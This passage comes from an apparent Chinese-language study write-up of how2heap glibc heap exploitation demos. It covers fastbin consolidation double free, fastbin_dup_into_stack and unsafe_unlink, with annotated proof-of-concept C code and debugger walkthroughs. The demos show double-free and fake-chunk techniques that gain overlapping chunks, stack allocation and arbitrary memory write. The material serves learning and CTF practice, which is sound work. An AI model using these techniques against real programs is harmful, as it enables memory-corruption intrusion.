class="keyword">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class="line">         p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">         p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       set_head(p, size | PREV_INUSE);</span><br><span class="line">       p-&gt;bk = unsorted_bin;</span><br><span class="line">       p-&gt;fd = first_unsorted;</span><br><span class="line">       set_foot(p, size);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">else</span> &#123;</span><br><span class="line">       size += nextsize;</span><br><span class="line">       set_head(p, size | PREV_INUSE);</span><br><span class="line">       av-&gt;top = p;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">   &#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    malloc_init_state(av);</span><br><span class="line">    check_malloc_state(av);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于这个函数流程做个简单的解释</p><p>先通过<code>get_max_fast</code>函数确定堆是否被初始化了，如果没有初始化堆然后退出函数</p><p>从fastbin中获取一个空闲chunk，并首先尝试向后合并，这里向后合并指的是向低地址合并</p><p>然后尝试向前合并，如果此时于<code>top_chunk</code>相邻，就合并到<code>top_chunk</code>中</p><p>如果不相邻就放入到unsorted bin中，然后继续取fastbin chunk直到fastbin list为空结束</p><p>本例中的触发代码：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13508588455/0" alt="image-20210510133037099"></p><p>这里有个疑惑就是，不是说好的放入unsorted bin中嘛，为什么会出现在small bin中，其实我们在分配largebin时，ptmalloc会首先遍历一下fastbin，将相邻的chunk进行合并，并链接到unsorted bin中，然后遍历unsorted bin中的chunk，如果unsorted bin中只有一个chunk，并且这个chunk在上次分配时被使用过，并且所需要分配的chunk大小属于small bins，并且chunk的大小大于等于所需分配的大小，这种情况下就算直接将该chunk进行切割，分配结束，否则将根据chunk的空间大小将其放入small bins或是largin bins中</p><p>这就是为什么不在unsorted bin而在small bin中的原因了</p><blockquote><p>如果连large bin中都没有合适的，那就只能从top chunk中分割出一部分了，如果连top chunk也不满足，那就会mmap或者brk一块内存增加top chunk的大小</p></blockquote><p>我们此时继续free p1</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13508752242/0" alt="image-20210510141428106"></p><p>我们可以看到他现在既在small bin中又在fast bin中了，这是为什么呢</p><p>我们再次free的时候ptmalloc会发现fastbin是空闲的，因此就把他扔到fastbin中去了，此时就可以分配两次p1了，一次会在fastbin中取出(优先查看fastbin)，第二次就会在smallbin中取出:)</p><h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>程序先malloc了两个fastbin(0x40)，然后free掉第一个chunk</p><p>这里为什么不free掉第二个chunk，因为第二个chunk是跟top chunk相邻，如果free了就会合并到top chunk中</p><p>之后程序调用了malloc函数malloc了一个large bin，触发了malloc_consoldate函数，导致我们free掉的chunk进入了small bin中然后程序第二次free chunk1，ptmalloc会先看fastbin中有没有，发现没有，于是就把chunk放入到fastbin中，这是chunk在fastbin和small bin中就各有一个，此时程序再申请两次0x40的chunk,ptmalloc先从fastbin中把chunk1取出来给用户,然后再从smallbin中再次把chunk1取出来给用户，我们就有了两个拥有同样内存的chunk。</p><h1 id="0x04-fastbin-dup-into-stack"><a href="#0x04-fastbin-dup-into-stack" class="headerlink" title="0x04 fastbin_dup_into_stack"></a>0x04 fastbin_dup_into_stack</h1><h2 id="源代码-3"><a href="#源代码-3" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 这个程序就是fast_dup的2.0版，作用就是欺骗系统把malloc的地址转到我们所能控制内容的栈上,也就是让下一次分配内存时在我们所能控制的栈上分配</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file extends on fastbin_dup.c by tricking malloc into\n&quot;</span></span><br><span class="line">       <span class="string">&quot;returning a pointer to a controlled location (in this case, the stack).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> stack_var;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//我们控制分配的地址就是这个栈上变量的地方</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, <span class="number">8</span>+(<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//这里还是一样的,不能连续释放同一个chunk</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line"><span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//这里再次,释放a,double free</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p, %p, %p ]. &quot;</span></span><br><span class="line"><span class="string">&quot;We&#x27;ll now carry out our attack by modifying data at %p.\n&quot;</span>, a, b, a, a);</span><br><span class="line">    <span class="comment">//现在第一次分配内存,取出chunk a 赋给chunk d</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//现在分配两次内存,取出chunk a,chunk b</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, d);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">    <span class="comment">//现在free list就只剩下一个chunk a了</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p ].\n&quot;</span>, a);</span><br><span class="line">    <span class="comment">//现在的chunk a是free list的头chunk了,现在我们把一个假的free size写到栈上,这个时候ptmalloc就会认为栈上有一个free的chunk,就会把指针回转给他了</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we have access to %p while it remains at the head of the free list.\n&quot;</span></span><br><span class="line"><span class="string">&quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot;</span></span><br><span class="line"><span class="string">&quot;so that malloc will think there is a free chunk there and agree to\n&quot;</span></span><br><span class="line"><span class="string">&quot;return a pointer to it.\n&quot;</span>, a);</span><br><span class="line">stack_var = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//现在我们把栈指针的向前八个字节写成0x20,也就是伪造free size,然后把他赋给d</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;</span>, a);</span><br><span class="line">*d = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) (((<span class="keyword">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//这个时候就把栈指针写到了free list上了,此时再分配就是在栈上分配了</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(8): %p, putting the stack address on the free list\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;4th malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运行结果及调试-2"><a href="#运行结果及调试-2" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>首先看下分配完三个chunk后的结果</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13508844964/0" alt="image-20210510143659280"></p><p>此时我们利用fastbin的double free来形成一个环</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13508848465/0" alt="image-20210510143743534"></p><p>接下来我们要将第二次free的a给申请回来，作为我们的d，并且将这个d的fd赋值为stack_var的地址</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13508861212/0" alt="image-20210510144108062"></p><p>能看到此时我们的d的fd地方已经写上了stack_var的地址</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13508873167/0" alt="image-20210510144425686"></p><p>此时我们的free list中有了栈指针，我们再继续分配就可以分配到栈的内存空间了</p><h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><p>程序先在栈上定义了一个变量stack_var</p><p>之后malloc了三个chunk a,b,c</p><p>之后做了一个double free,形成了一个a-&gt;b-&gt;a的free链</p><p>此时再次malloc了一个大小一样的chunk d,这个时候chunk d会拿出chunk a</p><p>之后我们又申请了一个一样大小的chunk出来拿出了b,这个时候链上就只剩下一个a了</p><p>此时我们伪造了stack_var,把他伪装成了一个free chunk,并且赋值给了chunk d,也就是chunk a,此时fd指针被伪造成了fake chunk,形成了一个新的free链</p><p>最后再申请内存的时候,我们就取出了栈上的内存</p><p>这种利用手法，变体的一种方式，也是平时做题时常用的一种手法就是栈地址变成了堆地址。</p><h1 id="0x05-unsafe-unlink"><a href="#0x05-unsafe-unlink" class="headerlink" title="0x05 unsafe_unlink"></a>0x05 unsafe_unlink</h1><p>unlink是一种经常会用到的技巧，关于unlink是什么就不介绍了，简单说下使用unlink的时机</p><ul><li>malloc<ol><li>在恰好大小的large chunk处取chunk时</li><li>在比请求大小大的bin中取chunk时</li></ol></li><li>free<ol><li>后向合并，合并物理相邻低物理地址空闲chunk时</li><li>前向合并，合并物理相邻高物理地址空闲chunk时(top chunk除外)</li></ol></li><li>malloc_consolidate<ol><li>后向和并，合并物理相邻低地址空闲chunk时</li><li>前向合并，合并物理相邻高地址空闲chunk时(top chunk除外)</li></ol></li><li>realloc<ol><li>前向拓展，合并物理相邻高地址空闲chunk（top chunk除外）</li></ol></li></ul><p>关于攻击效果的话就是p处的指针会变为 p-0x18</p><h2 id="源代码-4"><a href="#源代码-4" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">//we want to be big enough not to use fastbins</span></span><br><span class="line">   <span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//本测试的重点就是利用free来破坏我们的全局全局chunk0_ptr以实现任意地址写</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">   chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line">   <span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line">    </span><br><span class="line">   <span class="comment">// 全局指针为chunk0_ptr，我们将要攻击的chunk为chunk1_ptr </span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;The victim chunk we are going to corrupt is at %p\n\n&quot;</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 我们要在chunk0中伪造一个chunk</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;We create a fake chunk inside chunk0.\n&quot;</span>);</span><br><span class="line">   <span class="comment">// 我们把我们的fake_chunk的fd指向我们的chunk0_ptr来满足P-&gt;FD-&gt;BK=P </span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;</span>);</span><br><span class="line">   chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line">   <span class="comment">// 我们把我们的fake_chunk的bk指针指向我们的chunk0_ptr来满足P-&gt;BK-&gt;FD</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;</span>);</span><br><span class="line">   <span class="comment">//通过这么设置,我们就可以成功bypass堆的检测即(P-&gt;FD-&gt;BK!=P||P-&gt;BK-&gt;FD!=P)==FALSE </span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;</span>);</span><br><span class="line">   chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Fake chunk fd: %p\n&quot;</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Fake chunk bk: %p\n\n&quot;</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">   <span class="comment">//我们假设我们可以通过溢出chunk0使得我们可以自由的更改chunk1的内容</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n&quot;</span>);</span><br><span class="line">   <span class="keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">//我们用chunk1的previous_size来收缩chunk0，让free认为我们的chunk0是在我们伪造的chunk地方开始的</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;We shrink the size of chunk0 (saved as &#x27;previous_size&#x27; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n&quot;</span>);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;It&#x27;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n&quot;</span>);</span><br><span class="line">   chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">   <span class="comment">//如果我们正常的free chunk0，那么chunk1的pre_size将是0x90，然后现在是一个新的值 </span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n&quot;</span>,(<span class="keyword">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line">   <span class="comment">//我们通过将chunk1的pre_inuse设置为false，就可以将我们所伪造的chunk标记为free状态</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\n\n&quot;</span>);</span><br><span class="line">   chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//现在我们free chunk1，这是发生向后合并将会unlink我们所伪造的chunk，从而覆写chunk0_ptr</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n&quot;</span>);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n&quot;</span>);</span><br><span class="line">   <span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">   <span class="comment">//在这个指针上，我们可以通过chunk0_ptr来覆写其自身以指向任意内存</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n&quot;</span>);</span><br><span class="line">   <span class="keyword">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">   <span class="built_in">strcpy</span>(victim_string,<span class="string">&quot;Hello!~&quot;</span>);</span><br><span class="line">   chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//chunk0_ptr如今指向了我们想要的地方，我们可以用它来写我们的字符串了</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;</span>);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Original value: %s\n&quot;</span>,victim_string);</span><br><span class="line">   chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>,victim_string);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// sanity check</span></span><br><span class="line">   assert(*(<span class="keyword">long</span> *)victim_string == <span class="number">0x4141414142424242</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在进行调试前我们先康康unlink的部分代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1344</span><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="number">1345</span>     FD = P-&gt;fd;                                                               \</span><br><span class="line"><span class="number">1346</span>     BK = P-&gt;bk;                                                               \</span><br><span class="line"><span class="number">1347</span>     <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                     \</span><br><span class="line"><span class="number">1348</span>       malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="line"><span class="number">1349</span>     <span class="keyword">else</span> &#123;                                                                    \</span><br><span class="line"><span class="number">1350</span>         FD-&gt;bk = BK;                                                          \</span><br><span class="line"><span class="number">1351</span>         BK-&gt;fd = FD;                                                          \</span><br><span class="line"><span class="number">1352</span>         <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)                                      \</span><br><span class="line"><span class="number">1353</span>             &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;                \</span><br><span class="line"><span class="number">1354</span>             <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)        \</span><br><span class="line"><span class="number">1355</span>                 || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line"><span class="number">1356</span>               malloc_printerr (check_action,                                  \</span><br><span class="line"><span class="number">1357</span>                                <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="line"><span class="number">1358</span>                                P, AV);                                        \</span><br><span class="line"><span class="number">1359</span>             <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;                                    \</span><br><span class="line"><span class="number">1360</span>                 <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                                      \</span><br><span class="line"><span class="number">1361</span>                   FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;                     \</span><br><span class="line"><span class="number">1362</span>                 <span class="keyword">else</span> &#123;                                                        \</span><br><span class="line"><span class="number">1363</span>                     FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                         \</span><br><span class="line"><span class="number">1364</span>                     FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                         \</span><br><span class="line"><span class="number">1365</span>                     P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                         \</span><br><span class="line"><span class="number">1366</span>                     P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                         \</span><br><span class="line"><span class="number">1367</span>                   &#125;                                                           \</span><br><span class="line"><span class="number">1368</span>               &#125; <span class="keyword">else</span> &#123;                                                        \</span><br><span class="line"><span class="number">1369</span>                 P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;                 \</span><br><span class="line"><span class="number">1370</span>                 P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;                 \</span><br><span class="line"><span class="number">1371</span>               &#125;                                                               \</span><br><span class="line"><span class="number">1372</span>           &#125;                                                                   \</span><br><span class="line"><span class="number">1373</span>       &#125;                                                                       \</span><br><span class="line"><span class="number">1374</span> &#125;</span><br></pre></td></tr></table></figure><p>这里最主要需要绕过的地方就是(FD-&gt;bk != P || BK-&gt;fd != P)这里了，我们根据函数传进来的解释下</p><p>FD就算我们传进来的指针P的fd指针也就是FD=P-&gt;fd，而BK就是P-&gt;bk</p><p>也就是说我们需要满足的FD -&gt; bk = P，BK -&gt; fd = P其实就是</p><ol><li>P -&gt; fd -&gt; bk = P，即检测P的后一个空闲指针的前一个指针为P</li><li>P -&gt; bk -&gt; fd = P，同理检测P的前一个空闲指针的后一个指针为P</li></ol><p>那么如何利用呢，我们调试康康</p><h2 id="运行结果及调试-3"><a href="#运行结果及调试-3" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>首先我们停在mallc chunk0的地方</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13509297120/0" alt="image-20210510160016743"></p><p>此时我们有了一个chunk，接着我们再申请一个chunk，看下此时的堆块</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13509212229/0" alt="image-20210510160233831"></p><p>接着我们执行到下面的代码处</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13509222674/0" alt="image-20210510160420701"></p><p>注释中说我们将fake_chunk的fd指向我们chunk0_ptr</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13509495488/0" alt="image-20210510165958080"></p><p>这里一共输出了五样东西，可以看到chunk0_ptr[2]的值已经变成了&amp;chunk0_ptr-0x18</p><p>还记得之前说过的，我们需要在chunk0中伪造一个fake chunk</p><p>我们的chunk0_ptr是从0x603000开始的，但是我们要知道的是给用户的指针是从0x603010开始的，也就意味着我们的fake_chunk是从0x603010开始，以0x603020为fd指针，0x603028为bk指针</p><p>此时我们的fd指针已经伪造好了，下面我们直接结束伪造bk指针的部分，康康此时的堆</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13509526752/0" alt="image-20210510170603411"></p><p>好了，此时我们已经成功的伪造了我们的fake_chunk的fd和bk指针，程序注释说我们这样就可以成功bypass那两个条件，也就是P-&gt;FD-&gt;BK=P&amp;&amp;P-&gt;BK-&gt;FD=P了，这是为什么呢？</p><p>我们现在假设我们的fake_chunk的size已经设好了，并且他的fd=0x602060，bk=0x602068，那么</p><p>fake_chunk-&gt;fd-&gt;bk是多少呢，我们看一下</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13509546783/0" alt="image-20210510170903296"></p><p>可以看到此时的fake_chunk-&gt;fd-&gt;bk=0x603010，还记得我们刚刚所说的，我们所伪造的fake_chunk就是0x603010</p><p>此时第一个条件已经达成了，我们再来看看第二个条件，也就是P-&gt;BK-&gt;FD=P</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13509562621/0" alt="image-20210510171128701"></p><p>同样的，我们成功达成了第二个条件，此时的fake_chunk也就是指向我们全局变量的chunk0_ptr已经可以bypass了，现在值得注意的是我们刚刚假设size已经设好了，但其实并没有</p><p>那么根据程序所说，假设我们可以溢出chunk0来自由的更改chunk1的内容，我们就可以通过更改chunk1的pre_size域来使得我们的chunk收缩以骗过malloc让他认为我们的chunk1的上一个chunk是从我们的fake_chunk开始的</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13509594767/0" alt="image-20210510171652381"></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13509596070/0" alt="image-20210510171707941"></p><p>可以看到我们此时获取到了chunk1的地址，此时是为了修改chunk1的pre_size来实现chunk0收缩</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13509618775/0" alt="image-20210510172122600"></p><p>可以看到此时chunk1的pre_size域已经被设为了0x80，这也就意味着系统向前找chunk的时候会向前0x80找到我们的fake_chunk，但是这还不够，我们需要伪造chunk0是free态的chunk，只需要把标志位设为0就好了，也就是执行到下面一步</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13509636936/0" alt="image-20210510172451277"></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13509637692/0" alt="image-20210510172501037"></p><p>可以看到此时我们的chunk1的pre_inuse已经被设为0了</p><p>此时我们free chunk1，这是就会发生unlink</p><p>这里就触发了free的向后合并，也就是向物理相邻低地址合并从而调用unlink函数，此时的堆结构</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13509757035/0" alt="image-20210510174518847"></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13509770504/0" alt="image-20210510174729789"></p><p>可以看到此时本来存放chunk0地址的地方变成的&amp;chunk0_ptr-0x18，即本来0x602078存放的是chunk0_ptr也就是0x603010的地址，此时被修改成了0x602060，也就是chunk中包含了指向chunk的指针，并且我们可以覆写它，也就达到了任意地址读写</p><p>后面的赋值感觉没什么可以说的，前面的就是相当于直接修改了存放chunk指针的区域，导致劫持了chunk指针，从而能够达到任意读写的作用</p><h2 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h2><p>依旧,程序先是弄了一个全局变量chunk0_ptr,紧接着给他申请了0x80实际上是0x90的内存空间</p><p>之后新建了一个大小一样的chunk1_ptr</p><p>这时我们要确定的是我们的全局指针是chunk0_ptr,要攻击的chunk是chunk1_ptr</p><p>之后程序构造了P-&gt;FD-&gt;BK=P和P-&gt;BK-&gt;FD=P的条件,想要伪造一个fake_chunk</p><p>假设我们拥有溢出的能力,修改chunk1_ptr的pre_size域让系统认为我们的上一个chunk是我们伪造的fake 